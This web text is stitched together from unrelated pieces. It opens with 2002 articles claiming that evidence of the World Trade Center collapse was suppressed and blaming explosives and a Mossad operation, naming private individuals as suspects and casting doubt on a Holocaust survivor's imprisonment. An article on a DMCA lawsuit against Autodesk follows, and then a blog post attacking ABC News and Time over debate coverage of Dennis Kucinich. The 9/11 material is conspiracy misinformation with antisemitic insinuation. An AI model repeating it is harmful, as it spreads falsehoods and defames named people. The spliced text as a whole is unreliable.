" Such destruction of evidence , " Manning said , " shows the astounding ignorance of government officials to the value of a thorough , scientific investigation of the largest fire - induced collapse in world history . "
" I have combed through our national standard for fire investigation , NFPA 921 , but nowhere does one find an exemption allowing the destruction of evidence for buildings over 10 stories tall , " Manning said .
" Clearly , there are burning questions that need answers .
Based on the incident 's magnitude alone , a full - throttle , fully resourced , forensic investigation is imperative . "
Three months later , the Science Committee of the House of Representatives reported that the WTC investigation was " hampered " by the destruction of crucial evidence .
The committee report of March 6 says , " Some of the critical pieces of steel ... were gone before the first investigator ever reached the site . "
The investigation Manning called for never happened and never will , because the essential evidence is now destroyed .
" The FEMA - sponsored building performance assessment currently being conducted of the World Trade Center is just that : an assessment , not an investigation , " Prof. Glenn Corbett of John Jay College of Criminal Justice in New York City told the Science Committee in March .
Corbett had previously called the FEMA - led investigation " uncoordinated " and " superficial . "
" You would think we would have the largest fire investigation in world history .
You would be wrong , " Corbett wrote .
" We are literally treating the steel removed from the site like garbage , not like crucial fire scene evidence . "
WHO'S IN CHARGE ?
The New York Times was unable to find out who was behind the destruction of evidence .
On Dec. 25 , 2001 , the Times reported , " Officials in the mayor 's office declined to reply to written and oral requests for comment over a three - day period about who decided to recycle the steel and the concern that the decision might he handicapping the investigation . "
" I must say that the current investigation - some would argue that ' review ' is the more appropriate word - seems to be shrouded in excessive secrecy , " said Rep. Sherwood Boehlert ( R - N.Y . ) .
" There are no clear lines of authority , " he said .
" No one is in charge . "
Before the dust had settled on Sept.11 , the mayor of New York City , Rudolph Giuliani , and Kenneth Holden of the city 's Dept. of Design and Construction ( DDC ) , contracted 4 major construction management companies to begin the removal of the debris from the World Trade Center .
Three of the four major companies involved in the clean - up were foreign owned : AMEC , Bovis Lend Lease , both headquartered in London ; and Turner , a subsidiary of Germany 's Hochtief .
Only Tully Construction of Flushing , N.Y. , is a truly American - owned company .
Peter Tully , president of the company , was the only contractor willing to speak openly with me about his work at the WTC site .
" I was there every day , " Tully said .
" The mayor 's office and DDC called us on Sept. 11 ... on the site we had at least three meetings a day with Ken Holden and Mike Burton . "
The WTC site was initially divided into four quadrants and Tully Construction was assigned to Quadrant 3 .
Tully said his company had worked on the South Tower , WTC 4 and 5 , and the 425,000 square foot underground retail mall .
' EVERYTHING WAS PULVERIZED '
" Think of the thousands of file cabinets , computers , and telephones in those towers - I never saw one - everything was pulverized , " he said .
" Everything that was above grade - above the 6th and 7th floor - disintegrated ... it was like an explosion . "
Tully Construction specializes in concrete .
I asked Mr. Tully if he had ever seen concrete pulverized as it was at the WTC .
" No - never , " he said .
Tully said that there were hot spots where he observed " literally molten steel . "
Asked about what could have caused such intense heat , Tully said , " Think about the jet fuel . "
BRITISH MANAGEMENT
The London - based firm AMEC , ranked by Engineering News - Record magazine as " the world 's largest firm , " oversaw the actual management of the debris removal at both the Pentagon and the WTC .
" AMEC was the only construction company working at both disaster sites , " the company 's web site says .
" AMEC is managing Hudson River barging operations to transport the rubble from the entire WTC site to a landfill on Staten Island and to steel recycling operations in New Jersey . "
AMEC had just finished the renovation at the Pentagon when it was called to manage the removal of debris there and at the World Trade Center .
" AMEC was placed in charge by the City of New York of organizing and engineering the around - the - clock clean up operation in the northwest sector , " the web site says , which included the North Tower and WTC 6 ( U.S. Customs House ) .
The company also cleaned up the 47 - story WTC 7 , which mysteriously collapsed late in the afternoon of 9 - 11 .
AMEC co-managed the WTC site with another London - based firm , Bovis Lend Lease , from January 2002 .
Bovis was a somewhat troubled construction subsidiary of Britain 's P&O. Bovis was acquired by Australia 's Lend Lease Corp in 1999 .
Bovis is headed by Sir Frank Lampl , a Czechoslovakian who immigrated to England at age 42 .
Lampl , who claims to have been imprisoned in Auschwitz and Dachau during the Nazi era , has become a British knight .
I spoke with Mary Costello , spokesperson for Bovis in New York .
Costello said the company had assumed " overall responsibility " for the WTC site on Jan 4 .
She did n't want to discuss what buildings Bovis had worked on and said , " You should not be contacting us .
You should be speaking to DDC . "
Calls to DDC public affairs department are neither answered nor returned .
Turner Construction , the third foreign firm , is a wholly - owned subsidiary of Hochtief AG , headquartered in Essen , Germany .
AMEC & THE PENTAGON
AMEC is an " informal acronym " for Asset Management and Engineering Consultancy , according to the firm 's communications director David Paterson .
Paterson told me that oil and gas extraction provides 25 percent of the company 's revenue .
AMEC operates the North Sea oil rigs for Shell and British Petroleum , he said .
AMEC had just completed a project to strengthen and renovate a section of the Pentagon .
Wedge 1 , when the building was attacked .
The damaged area is between Wedges 1 and 2 .
Marcella Diaz , communication director for the firm's U.S. subsidiary , AMEC Construction Management , told me that the company 's work in the Pentagon had been completed on the Friday just before Tuesday , Sept. 11 .
Paterson said that AMEC is the " prime contractor for the U.S. Dept of Defense on environmental work . "
The firm was paid some $ 752 million for its 2 - year renovation and clean - up at the Pentagon , according to Rachel Decker , spokesperson for the Pentagon 's renovation entity known as PENREN .
The fact that a British firm had been given the contract to renovate the Pentagon was " not a problem , " Decker said .
Asked about who was in charge of the clean - up at the WTC , Paterson said , " The City of New York was the project manager . "
The director of DDC , Kenneth Holden , was named as the person in charge at the site according to Paterson .
AMEC is in line for further construction work at both the Pentagon and the World Trade Center according to the Daily Mail , a British newspaper .
The company 's London - based chief executive , Sir Peter Mason , said about the Pentagon clean - up : " The target is to have it reopened for business by Sept. 11 , 2003 , as a point of principle . "
Mason is a knight of the British Empire .
The former mayor of New York , Rudolph Giuliani , who gave the management of the WTC site to the two British firms , AMEC and Bovis Lend Lease , received an honorary knighthood in the Order of the British Empire from Queen Elizabeth II on 13 February 2002 .
When Giuliani was made a knight of the British Empire he joined an exclusive club which includes George H.W. Bush , Ronald Reagan , Colin Powell , Wesley Clark , Norman Schwarzkopf , and Steven Spielberg .
Bush and Reagan are also both knights in the Order of the Bath .
Firefighters ' Final Words Debunk Fire Collapse Theory
August 7 , 2002
Evidence that debunks the official explanation for the collapse of the World Trade Center is being kept secret by the Department of Justice on a flimsy pretext .
The Department of Justice has ordered secrecy measures to keep the contents of a " lost tape " of firefighters ' voices at the World Trade Center from being made public .
The 78 - minute audiotape evidently debunks the accepted explanation that intense jet fuel fires melted the towers ' steel beams and caused the collapses .
The New York Times recently revealed the existence of the tape of radio transmissions between firefighters of the New York Fire Department ( NYFD ) , which proves that " at least two men " had reached the 78th floor Sky Lobby of the South Tower .
The firefighters had reported about the fires and casualties they encountered and had begun evacuating the survivors .
The article said that firefighters " reached the crash zone on the 78th floor , where they went to the aid of grievously injured people trapped in a sprawl of destruction . "
While the article raises as many questions as it answers , it points to a reason for the secrecy : " Once they got there , " the article says , " they had a coherent plan for putting out the fires they could see and helping victims who survived . "
The report names two of the firefighters who were at the crash site : Battalion Chief Orio J. Palmer , who was organizing the evacuation of injured people , and Fire Marshal Ronald P. Bucca .
Both were among the 343 firefighters who perished .
The voices of the firefighters " showed no panic , no sense that events were racing beyond their control , " the Times wrote .
" At that point , the building would be standing for just a few more minutes , as the fire was weakening the structure on the floors above him .
Even so , Chief Palmer could see only two pockets of fire , and called for a pair of engine companies to fight them . "
The fact that veteran firefighters had " a coherent plan for putting out " the " two pockets of fire " indicates they judged the blazes to be manageable .
These reports from the scene of the crash provide crucial evidence debunking the government 's claim that a raging steel - melting inferno led to the tower 's collapse .
As the FEMA " Building Performance Assessment " report says , " Temperatures may have been as high as 900 - 1,100 degrees Celsius ( 1,700 - 2,000 Fahrenheit ) in some areas . "
" If FEMA 's temperature estimates are correct , the interiors of the towers were furnaces capable of casting aluminum and glazing pottery , " Eric Hufschmid , author of the book Painful Questions writes .
Yet the voices on the tape prove that several firefighters were able to work " without fear " for an extended period at the point of the crash , and that the fires they encountered there were neither intense nor large .
The South Tower disintegrated in less than an hour after being hit by a plane , which impacted between its 78th and 84th floors .
" Fire has never caused a steel building to collapse , " he writes .
" So how did a 56 - minute fire bring down a steel building as strong as the South Tower ? "
His forthcoming book presents compelling evidence that explosives caused the towers to collapse .
Pointing to the Meridian Plaza fire in Philadelphia in 1991 , he wrote , " The Meridian Plaza fire was extreme , but it did not cause the building to collapse .
The fire in the South Tower seems insignificant by comparison to both the Meridian Plaza fire and the fire in the North Tower .
How could the tiny fire in the South Tower cause the entire structure to shatter into dust after 56 minutes while much more extreme fires did not cause the Meridian Plaza building to even crack into two pieces ? "
The Port Authority of New York and New Jersey ( PA ) , the bi-state authority and owner of the World Trade Center , retrieved the " lost tape . "
A spokesman for the authority , Greg Trevor , told me that the tape was found in PA police offices at 5 WTC , " two or three weeks " after 9 - 11 .
The PA police monitored radio transmissions from the WTC .
Because of an unexplained delay in producing the tape , it was believed " for months " that firefighters had gone no higher than about the 50th floor in each tower .
The delay , Trevor said , was due to the time required to transfer the voice data to " encrypted CDs . "
In January or February , the PA offered a copy of the tape to NYFD officials , who reportedly declined the offer because they did not want to sign the confidentiality agreement as demanded by the PA .
The Independent ( U.K. ) added that the PA " held back from sharing it with police and only relinquished it on condition that a confidentiality agreement was signed . "
" That 's not correct , " Trevor said , regarding the allegation that the PA had withheld the tape from the police .
The PA had only handled the tape " under the instruction of the U.S. attorney 's office , " he said .
Spokesman Bernard Gifford said NYPD had not pursued a criminal investigation of 9 - 11 , having " turned it over " to the FBI .
Gifford would n't say when this occurred , although Joe Valiquette of the New York office of the FBI told me that the federal bureau had run the investigation " from the moment it happened . "
On Aug. 2 the relatives of the 16 firefighters whose voices were identified on the tape were allowed to hear their last words in a New York City hotel .
The families were first required to sign a statement prepared by lawyers that they would not disclose what was said on the tape .
Despite the fact that the contents of the tape are being kept secret , the Times article says , " Only now , nearly a year after the attacks , are the efforts of Chief Palmer , Mr. Bucca and others becoming public .
City fire officials simply delayed listening to a 78 - minute tape that is the only known recording of firefighters inside the towers . "
While Fire Commissioner Nicholas Scoppetta said he had not known the tape existed until " very recently , " both the Times and CNN err in claiming that the NYFD is the agency behind the extreme secrecy .
" The Fire Department has forbidden anyone to discuss the contents publicly on the ground that the tape might be evidence in the trial of Zacarias Moussaoui , the man accused of plotting with the hijackers , " the Times said .
When I asked the NYFD why the only conversations between firefighters engaged at the scene of the crash had to be kept secret because of Moussaoui , who was in prison in Minnesota at the time , the spokesman replied , " Take it up with the Department of Justice . "
Asked about the numerous reports by eyewitnesses , including firefighters , of explosions inside the towers before they collapsed , Mike Logrin , spokesman for the NYFD , said , " We 're pretty sure there were n't bombs in the building . "
On Sept. 11 the British Broadcasting Corp. ( BBC ) interviewed one of its New York - based reporters , Steve Evans , who was in the second tower when it was hit .
" I was at the base of the second tower , the second tower that was hit , " Evans said .
" There was an explosion — I did n't think it was an explosion — but the base of the building shook .
I felt it shake . . . then when we were outside , the second explosion happened and then there was a series of explosions .
. . .
We can only wonder at the kind of damage — the kind of human damage — which was caused by those explosions — those series of explosions , " he said .
Evans is a professional journalist and although his observations of explosions in the second tower should be taken into account , they are not .
Numerous eyewitnesses reported also seeing or hearing explosions .
Valiquette of the FBI told me that he had not " heard anything " about reports of explosions in the building and that he had " never heard any discussion of it " in the FBI 's New York office .
9 -11 Terror Suspect Hiding in Israel
July 31 , 2002
The Israeli owner of the Mossad " front " company who fled to Israel after his " movers " were caught filming the World Trade Center attacks remains at large although the FBI , which has an office in Tel Aviv , has his name on its terror suspect list .
A leaked " FBI Suspect List " circulated among financial institutions in Italy shows that Dominik Suter , the Israeli owner of Urban Moving Systems who fled in haste to Israel after 9 - 11 , is among those suspected of being behind the terror attacks .
Despite the presence of an FBI office in Tel Aviv and the " intimate relationship " between U.S. and Israeli intelligence agencies , Suter apparently remains out - of - reach .
The suspect list is classified " Law Enforcement Sensitive " and is periodically updated .
The list published on an Italian website was dated 22 May 2002 and was accompanied by two documents from February : an explanatory letter from the Italian state agency engaged in fighting money laundering , the Ufficio Italiano dei Cambi , and a distribution list from Assifact , an Italian association for factoring .
A factoring company finances accounts of businesses .
" If we deal with anybody on this list , we are obliged to notify the authorities , " Liliana Corti of the Milano - based Assifact told me .
While Dominik Suter 's name is on the list , oddly his Israeli nationality is not .
Three addresses , two in New Jersey and one in Sherman Oaks , California , are given , as is his Social Security number .
The year 1970 is provided for his date of birth .
When I asked the FBI about the list , a spokeswoman said , " We 're not going to validate your questions by talking about the list .
You are not supposed to have it .
It is not for public consumption . "
Asked about Israeli cooperation regarding suspects being harbored in the state of Israel , Bill Carter , Unit Chief of the FBI 's National Press Office in Washington , said Israel was " under no obligation " to turn over suspects and that it did so only as a " matter of good will . "
Carter told me to contact the FBI office in Tel Aviv for information regarding any extradition request for Suter .
Robert Geeslin , an FBI agent , is the " deputy legal attaché " and has an office in the U.S. Embassy in Israel .
Geeslin 's office , however , refused to discuss the matter .
I then spoke with Mark Regev , spokesman for the Israeli government in Washington .
Regev said the U.S. and Israeli authorities have " an intimate relationship " that is " excellent " and " on-going . "
The " close cooperation " between Israel and the U.S. includes sharing intelligence information .
While I repeatedly asked Regev if Israeli authorities would cooperate by apprehending a terror suspect for questioning by the FBI , three times Regev avoided answering the question .
The first week after 9 - 11 , I wrote about the 5 exuberant Israelis seen celebrating while filming the attacks on the World Trade Center .
Although the men claimed to be movers working for the New Jersey - based Urban Moving Systems , it soon became clear that they were actually Israeli intelligence agents .
One of the men later said , " Our purpose was to document the event . "
Forward , a respected Jewish newspaper in New York , reported in March 2002 that the five Israelis were " conducting a Mossad surveillance mission . "
The men had first been observed exulting while filming the attacks on the WTC from the roof of a white moving van in the parking lot of a New Jersey apartment building across the river from lower Manhattan .
" They seemed to be taking a movie , " the resident who noticed them said .
The men were taking video or photos of themselves with the World Trade Center burning in the background , she said .
What struck her were the expressions on the men's faces .
" They were like happy , you know … they did n't look shocked to me .
I thought it was very strange , " she said .
The moving van belonged to a front company called Urban Moving Systems .
Around 4 p.m. on Sept. 11 , the van was pulled over , and five Israelis : Sivan and Paul Kurzberg , Yaron Shmuel , Oded Ellner and Omer Marmari , all Israelis between 22 and 27 years old , were arrested at gunpoint .
One had $ 4,700 in cash hidden in his sock while another carried two foreign passports .
Box cutters were found in the van .
One of the Israeli agents spoke on an Israeli television show after being deported , saying , " The fact of the matter is we are coming from a country that experiences terror daily .
Our purpose was to document the event . "

Oded Ellner
Omer Marmari Oded EllnerOmer Marmari
The case was turned over to the FBI 's Foreign Counterintelligence Section after the names of two of the five Israelis showed up on a CIA - FBI database of foreign intelligence operatives .
At that point , he said , the bureau took control of the investigation and launched a Foreign Counterintelligence Investigation , or FCI , because the FBI believed Urban Moving Systems was a cover for an Israeli intelligence operation .
" An FCI means not only that it was serious but also that it was handled at a very high level and very tightly , " a former official told Forward .
" The FBI came to the conclusion at the end of its investigation that the five Israelis arrested in New Jersey last September were conducting a Mossad surveillance mission and that their employer , Urban Moving Systems of Weehawken , N.J. , served as a front , " Forward reported on March 15 .
While the FBI searched the company 's Weehawken , N.J. , offices , removing boxes of documents and a dozen computer hard drives , the Israeli owner of the company , Dominik Otto Suter , was allowed to quickly flee the country .
After one brief interview , FBI agents tried to interview Suter only to discover that he had cleared out of his New Jersey home and fled to Israel .
Authorities confirmed that Urban Moving Systems was a Mossad front , whose " main office " was nothing but a mailbox address in midtown Manhattan .
ABC
News reporters visited the company 's New Jersey warehouse saying , " It looked as if it had been shut down in a big hurry .
Cell phones were lying around ; office phones were still connected ; and the property of dozens of clients remained in the warehouse . "
The state of New Jersey seized the property and has a lawsuit pending against Urban Moving Systems and Suter , an Israeli citizen .
The Israelis had been held at the Metropolitan Detention Center in Brooklyn , for overstaying their tourist visas and working in the United States illegally .
Two weeks after their arrest , an immigration judge ordered them to be deported , however , however , FBI and CIA officials in Washington put a hold on the case .
The five Israeli agents were held in detention for more than two months while some were held in solitary confinement for 40 days and given as many as seven lie - detector tests .
One of the Israelis , Paul Kurzberg , refused to take a lie - detector test for 10 weeks and then failed it , according to his lawyer .
After 71 days in jail , a deal was struck between Israeli and U.S. government officials and the five Israeli spies were put on a plane and deported to Israel on November 20 .
What Exploded at WTC 6 ?
July 12 , 2002
There has been some confusion about when the CNN video showing the mysterious explosion of 9 - 11 was filmed .
In order to clarify the timing , I contacted CNN archives in Atlanta .
The most senior archivist available , who could only reveal his first name , Andy , said that the footage showing the mysterious explosion had been shot as the second plane crashed into the South Tower , about 9:04 a.m .
There has been some doubt about the large amount of smoke seen around the south tower in the background .
Most television viewers did not see the debris and smoke that fell around the South Tower after the plane crashed because tall buildings were in the way .
A series of photos by Carmen Taylor , however , show that the amount of smoke and debris , and the way that if fell , match the image from CNN , which is taken from the opposite side of the towers .
Carmen Taylor of Lavaca , Ark. , was visiting New York City and caught on film the moment United Airlines Flight 175 crashed into the south tower of the World Trade Center .
Taylor was vacationing in New York when she spotted an airplane flying toward the World Trade Center , which had been struck by another plane minutes earlier .
The second plane struck the Trade Center 's second tower , and Taylor captured the event in an astonishing series of digital photographs that aired on the local ABC affiliate , Channel 40/29 .
Taylor was just about to board the Staten Island Ferry to see the Statue of Liberty when the first explosion happened .
She turned her camera on , and started shooting .
As she did , she caught the explosions after the first plane struck .
Then , she captured the second plane just before it hit the tower .
" There had been helicopters circling , " Taylor said .
" And then , this big plane comes up , and I thought ' OK , there 's a plane going by . '
Within seconds , it went straight into the other tower .
" We were just standing , looking at the World Trade Center , and all of a sudden , it lit up like massive fireworks , " she said .
What Caused the WTC 6 Crater ?
July 10 , 2002
Before the smoke had cleared from around the stricken South Tower , a mysterious explosion shot 550 feet into the air above the U.S. Customs House at 6 World Trade Center .
This unexplained blast at the Customs House has never been investigated or reported in the mainstream media .
Despite the fact that the horrible events of September 11 occurred in broad daylight and were widely photographed , significant aspects of the attacks have been completely suppressed by a media blackout .
A massive explosion , witnessed by millions of television viewers on CNN , evidently devastated WTC 6 , the 8 - story U.S. Customs House , although no national newspaper or media outlet has said a word about it .
The unexplained blast occurred between the burning North Tower and the 47 - story Salomon Brothers Building , known as WTC 7 , immediately after United Airlines Flight 175 smashed into the South Tower , at about 9:03 a.m .
The explosion at WTC 6 was shown afterwards on CNN .
Because it not broadcast as it happened there has been some confusion about when it actually occurred .
The large amount of smoke seen cascading around the South Tower in the video led some observers to mistake the blast for a dust cloud from the subsequent collapse of the tower .
TIMING CONFIRMED
I contacted CNN to determine exactly when the footage was filmed .
CNN 's Public Affairs Department confirmed that the explosion shown in the footage occurred immediately after the second plane had crashed into the South Tower .
When asked if the footage was taken at 9:04 a.m. , the CNN archivist who could not give his last name , said , " That 's correct . "
When asked if CNN could offer any explanation about what might have caused the blast that clearly reached 550 feet , soaring higher than the 47 - story WTC 7 in the foreground , the archivist said , " We ca n't figure it out . "
The affected space between WTC 7 and the North Tower was occupied by the 8 - story U.S. Customs House building , also known as WTC 6 .
The building primarily housed the offices of some 760 employees of the Customs Service , a department of the U.S. Treasury .
A number of other federal agencies reportedly had offices in the building , including the Departments of Commerce , Agriculture , Labor , and the Bureau of Alcohol Tobacco & Firearms , although the agencies failed to return calls about the matter .
A spokesman for the Export - Import Bank of the U.S. , which had an office with 4 employees on the 6th floor of the Customs House did confirm the time of the explosion and said the employees had survived and been relocated to another location in the city .
One private company , Eastco Building Services , Inc. , reportedly leased space in the building .
A Seattle man is suing Autodesk for abusing the Digital Millennium Copyright
Act in an attempt to restrict the resale of its software .
The plaintiff , Tim Vernor , alleges that Autodesk has repeatedly sent copyright infringement notices to eBay , where he has tried to sell legal copies of Autodesk software , because the company does not want the used copies to compete with new sales of the software .
According to a copy of the complaint seen by Ars Technica , Autodesk began sending copyright infringement notices to eBay in May of 2005 .
He says that Autodesk never took the appropriate legal action to prevent the items from being relisted and instead continued to send DMCA notices to have the items removed .
After at least five incidents of being reported to eBay for copyright infringement , Vernor 's eBay account — where he was a powerseller — was disabled , which he says caused him to lose revenue from potential sales .
Autodesk attorney Andrew Mackay informed Vernor that the reason the company sent the notices was because the EULA on the software stated that it could not be resold and that Vernor did not have the liberty to transfer the software license to anyone else .
Vernor argues , however , that the doctrine of first sale — a law that states that a customer can sell or give away a legally obtained copy of something once it has been purchased , without the permission of the copyright holder — cannot be signed away in a EULA .
He adds to this the fact that Autodesk 's contract states that , by opening the box to the software , the purchaser agrees to the listed terms .
One problem : the contract is shrink - wrapped and located inside the box , and therefore the purchaser is not able to know the terms before opening the software .
Vernor 's case is not the first of its kind .
The sale of first doctrine has come into question several times in recent years , with the courts generally coming down on the side of the first sale doctrine .
A California judge ruled in 2001 that Adobe 's EULA did not apply to a businessman who bought bundled Adobe software and resold the individual components , because " the circumstances surrounding the transaction strongly suggest that the transaction is in fact a sale rather than a license . "
Another case was filed recently by Universal Music Group against a California man for selling promotional CDs on eBay .
The outcomes of both UMG's suit and Vernor 's case will carry important implications for the doctrine of first sale and shrink - wrapped EULAs .
It also carries implications for abusing the DMCA — this case is ultimately over a breach of contract , not copyright violations .
One of the reasons companies misuse the DMCA and its takedown letters is that the tools can quickly accomplish what they want to have happen ; stuff they do n't like generally disappears from a web site once the DMCA is invoked , properly or not .
When the other option is slogging slowly through the court system , takedown letters look like an excellent alternative .
If Vernor wins , it would strike a blow to companies that argue that consumers only buy a license to use the software , not the software itself .
Vernor is asking for $ 7,000 in lost sales , $ 350 in legal fees , and $ 10 million in punitive damages .

Following last Sunday 's Democratic presidential debate on ABC News '
This Week with George Stephanopoulos , Dennis Kucinich 's campaign asked ABC News to address issues it had with treatment Rep. Kucinich ( D - Ohio ) received both during the debate and afterward in ABC 's online coverage .
In an email sent out to supporters on Wednesday , the campaign said it " submitted objections and inquiries to ABC News representatives on Monday and Tuesday .
ABC
News representatives have failed to respond - or even acknowledge - those objections and inquiries . "
I confirmed with the Kucinich campaign yesterday that it has subsequently been forwarded the same response ABC News Executive Director Andrea Jones sent to The Washington Post and Time magazine .
ABC News representatives felt it necessary to answer the Kucinich campaign 's objections when Time magazine 's National Political Correspondent Karen Tumulty queried them .
Writing on the Time blog Swampland , Tumulty initially says of the Kucinich team 's issues with ABC 's treatment ( which included Kucinich not having a chance to speak until 28 minutes into the debate ) , " These all seemed like fair complaints to me , so I asked ABC News to respond . "
Then Tumulty says , " In an e-mail , Executive Director Andrea Jones answered him [ Kucinich ] point by point . "
While I give Tumulty credit for contacting ABC News , her investigative journalism unfortunately ends there .
Once she receives the email from Jones , Tumulty slips into stenography mode .
Jones ' " point by point " response to the Kucinich campaign 's complaints does not in itself exculpate or dispel any of ABC 's wrongdoing .
Tumulty fails to assess the accuracy and logic of Jones ' answers .
First , just so we 're all up to speed , here are the issues ( an aggregate of the thousands of complaints received during and after ABC 's debate coverage ) that the Kucinich campaign asked ABC News to address :
* Congressman Kucinich was apparently deliberately cropped out of a " Politics Page " photo of the candidates .
* Sometime Monday afternoon , after Congressman Kucinich took a commanding lead in ABC 's own on - line " Who won the Democratic debate " survey , the survey was dropped from prominence on the website .
* ABC
News has not officially reported the results of its online survey .
*
After the results of that survey showed Congressman Kucinich winning handily , ABC News , sometime Monday afternoon , replaced the original survey with a second survey asking " Who is winning the Democratic debate ? " * During the early voting Monday afternoon and evening , U.S. Senator Barack Obama was in the lead .
By sometime late Monday or early Tuesday morning , Congressman Kucinich regained the lead by a wide margin in this second survey .
* Sometime Tuesday morning , ABC News apparently dropped the second survey from prominence or killed it entirely .
* AND , as every viewer of the nationally televised Sunday Presidential forum is aware , Congressman Kucinich was not given an opportunity to answer a question from moderator George Stephanopoulos until 28 minutes into the program .
Now back to Tumulty commenting on Jones ' response [ emphasis below is mine ] :
This gist of her answer is this :
She denies that Kucinich was cropped out of any photo , noting that " there are 20 photos live on the ABC News website , Mr. Kucinich is in a number of them and there is even one of him and his wife .
He is one of 6 candidates who got his own photo in the slide show .
As for the images , clearly nothing was cropped , the image in question was shot by Charlie Neibergall of the AP not ABC . "
FALSE .
Had Tumulty - Time magazine 's National Political Correspondent and former member of the White House press corps - simply located the original AP photo ( which , at most , should 've taken a few minutes online ) , she would 've found Kucinich in it and realized the following version ABC News prominently displayed online after the debate had , indeed , been cropped :
So Jones either lied when she said " clearly nothing was cropped " or was misinformed by someone on her staff .
Since Tumulty seems to think her job ends with receiving answers from an ABC News spokesperson , she does n't question the veracity of Jones ' assertion , which is clearly false .
Adding to its duplicity , ABC News has now completely replaced the original photograph in question .
If you click on the link in Tumulty 's post ( which is supposed to bring you to that photo ) , you are now taken to a wholly different shot that includes Dennis Kucinich and is currently the default debate photo sitting on the ABC News website .
So , in case you 're keeping score , first ABC disappears Kucinich from a photo by cropping him out , then denies it , then later disappears the original cropped photo , replacing it with a separate photo that includes Kucinich , making it appear as if nothing improper ever occurred .
Eat your heart out Fox News .
Tumulty does later post an update after she manages ( she does n't say how ) to find her way to a page on the site Pinkraygun that shows the original AP photo and the doctored ABC photo side - by - side .
This compels Tumulty to gingerly concede " there does in fact appear to have been some cropping . "
First , it was either cropped or it was n't .
" Some cropping " gives the impression a whole cropping did n't occur , which it did .
Second , if there was " some cropping , " then logic follows that Jones either did some lying or some misinforming .
That , in turn , means Tumulty should be doing some follow up with Jones .
She does not .
Third , a question for Tumulty and her editors over at Time :
How did you fail to bring this simple fact to light yourselves ?
You had three main points to investigate - whether a photo was cropped , whether a poll was manipulated and whether Kucinich was allotted a fair amount of time .
Arguably , the cropped photo was the most simple and quick of the three to verify .
Did you attempt to find this on your own ?
If so , what 's your excuse for initially failing to obtain such readily available evidence ?
If not , what 's your excuse for failing to pursue this evidence in the first place ?
On to the poll (s ) :
She notes that the poll was and is live on ABC 's website .
( When I checked it , Kucinich was still winning , with Barack Obama a distant second . )
She also notes the poll 's disclaimer that it is " not a scientific survey , " which seems like a decent reason for ABC not to treat it as a news story .
MISLEADING .
Jones ' statement circumvents the facts and the original thrust of the Kucinich campaign 's complaint about the poll .
Tumulty 's unobtrusive reporting gives the impression the poll has always been up on ABC 's site in clear view and at no time were changes made to it .
FACT : The original poll , prominently displayed , asked , " Who won the Democratic debate ? "
Once Kucinich jumped ahead , this poll was scuttled from its prominence on the site .
As it became clear Kucinich was trouncing his competition , ABC just happened to decide to post a new poll asking , " Who is winning the Democratic debate ? "
As the Kucinich campaign ( and Tumulty ) correctly cited , Barack Obama had an early lead in this second poll ; but when Kucinich pulled ahead by a wide margin , ABC then dropped this poll from prominence , too .
( Because the Kucinich camp had difficulty finding the poll after ABC moved it , they questioned whether ABC may have buried the poll " or killed it entirely . "
It appears ABC did n't kill it entirely ; they just made it difficult for users work to find - which , as anyone who knows anything about online usability , is nearly tantamount to killing it ) .
Though of lesser importantance ( due to the current unverifiable nature of online polls ) , Tumulty still manages to mishandle Jones ' explanation of why ABC News did n't report the poll results .
This issue is about nuance and context .
Not exactly Tumulty 's and the mainstream media 's forte .
Yes , the online poll is " not a scientific survey " * ( incidentally , it 's verboten to mention in the mainstream media that phone surveys , many of which include leading and misleading questions , are often far from scientific accountings as well ) .
But since news outlets ( possibly ABC among them ) have certainly noted some online polls in the past but in context of their scientific shortcomings , and considering ABC 's shenanigans concerning Kucinich , it seems either intellectually dishonest or misinformed for Tumulty to give Jones the free pass " which seems like a decent reason for ABC not to treat it as a news story . "
Does Tumulty honestly believe it's " a decent reason " ?
Or does she merely believe it 's decent enough because the target of the question is ABC News and the questioner is the not - so - " viable " candidate Kucinich ?
I should note here that Tumulty frames her post with the opening line : " Should the networks and interest groups that have been sponsoring the seemingly endless series of debates and candidate forums start limiting their invitations to those contenders who seem , by whatever definition , ' viable ' ? "
She then claims to like " the idea of including candidates from the second tier -- and beyond -- in these settings , " saying , " You never know when lightning may strike , and how is an underfinanced long - shot going to get a breakout moment otherwise ? " and that " candidates such as Dennis Kucinich often are the only ones giving voice to ideas -- like single - payer health care and a quick withdrawal from Iraq - - that have not been embraced by the leading candidates , despite having significant support among the party rank and file . "
Yet Tumulty seems incapable of embracing such basic tenets of a democratic political process ; instead , she reverts to entrenched media establishment dogma to round out her post 's frame : " Still , having decided to include them , should they be given the same amount of time and attention as the leaders in the race ? "
This is the journalist we 're going to trust to get to the bottom of whether ABC News treated Dennis Kucinich fairly ?
Finally , there 's ABC 's defense of Kucinich receiving so little airtime during the debate and , once again , Tumulty 's stenographic framing and conclusions [ emphasis below is mine ] :
As for Kucinich 's complaint that he was not given a question in the first 28 minutes of the debate , Jones notes : " He may not have been addressed in the first 28 minutes , but he was the only candidate questioned in his own segment on This Week with George Stephanopoulos , two weeks in a row , that appearance is posted online as well .
Also .
Mr. Kucinich was the only candidate to address healthcare in Sunday 's debate , and that response was immediately clipped and posted on the ABC News website . "
Her bottom line : " After back to back appearances on ABC News '
This Week with George Stephanopoulos , clearly their claim is not substantiated by the facts nor by the extensive coverage of his candidacy on the ABCNews.com website . "
First , Jones ' " bottom line " skirts the issue at hand : she concedes ABC 's debate moderators failed to address Kucinich in the first 28 minutes of the forum ( though she frames her concession with the words " he may not have been addressed " rather than " he was n't addressed , " incorporating shades of doubt , as if this were somehow open to interpretation ) , but claims that ABC News has provided Kucinich much airtime overall .
Yet here 's the real bottom line :
In any equitable debate , no candidate should have to remain silent for the first 28 minutes .
Period .
This is not only unfair to Congressman Kucinich , but to all American citizens for whom news outlets such as ABC are supposed to be informing their decision - making process instead of acting to unduly manipulate it .
What 's more , Jones ' claim that Kucinich " was the only candidate questioned in his own segment on This Week with George Stephanopoulos , two weeks in a row " and that he had " back to back appearances " on this program is blatantly misleading .
( I must admit this one initially slipped by me until , while fact - checking another element of this story , I stumbled across the truth in a conversation I had yesterday with Kucinich campaign spokesman Andy Juniewicz .
More on that below ) .
FACT : Kucinich has made one appearance on This Week with George Stephanopoulos .
Jones has the audacity to count Kucinich 's appearance at this ABC debate as his second appearance on the show in which - breathing even new life into the word " truthiness " - he 's received " his own segment . "
Can Jones explain how a candidate receives his own segment during a debate ?
What in the world is she talking about ?
Moreover , in a statistical analysis of the debate performed by USA Election Polls , Kucinich was given less time to speak than any candidate with the exception of former Alaska Senator Mike Gravel .
